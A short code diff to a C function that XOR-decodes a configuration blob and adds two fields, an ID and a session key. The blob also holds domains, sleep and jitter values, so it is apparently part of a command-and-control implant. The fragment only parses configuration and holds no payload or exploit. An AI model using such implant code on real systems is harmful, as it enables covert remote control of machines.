@@ -46,6 +46,8 @@ BOOL LoadConfig() {
 	for (UINT i = 4; i < ProfileSize; i++) {
 		g_ByteMgr->InData[i] ^= kb[(i - 4) % 4];
 	}
+
+	hades->config->HadesID = g_ByteMgr->Read4();
 	hades->config->domaincounts = g_ByteMgr->Read4();
 	for (int i = 0; i < hades->config->domaincounts; i++) {
 		UINT len = g_ByteMgr->Read4();
@@ -74,6 +76,7 @@ BOOL LoadConfig() {
 
 	hades->config->Sleep = g_ByteMgr->Read4();
 	hades->config->Jitter = g_ByteMgr->Read4();
+	hades->config->SessionKey = g_ByteMgr->Read4();
 
 
 	HeapFree(GetProcessHeap(), 0, Temp);
